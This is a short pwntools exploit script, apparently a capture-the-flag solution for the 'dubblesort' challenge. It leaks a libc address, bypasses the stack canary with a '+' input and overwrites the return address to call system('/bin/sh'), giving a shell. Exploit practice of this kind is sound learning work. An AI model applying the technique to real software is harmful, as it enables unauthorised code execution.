from pwn import *
io=process("./dubblesort")
io.sendafter("What your name :","a"*25)

gdb.attach(io)
io.recvuntil("Hello aaaaaaaaaaaaaaaaaaaaaaaaa")

libc_leak=u32("\x00"+io.recv(3))-0x1b2000
io.recv(4)
code_leak=u32(io.recv(4))

log.info("libc @ "+ str(hex(libc_leak)))
log.info("code @ "+ str(hex(code_leak)))

system=libc_leak+0x3ada0

binsh = libc_leak+0x15ba0b

io.sendlineafter("How many numbers do you what to sort :","35")

for i in range(24):
    io.sendlineafter("Enter the {} number : ".format(i),"0")
io.sendlineafter("Enter the {} number : ".format(24),"+")

for i in range(8):
    io.sendlineafter("Enter the {} number : ".format(i+25),str(system-7+i))

io.sendlineafter("Enter the {} number : ".format(33),str(binsh-1))
io.sendlineafter("Enter the {} number : ".format(34),str(binsh))

io.interactive()
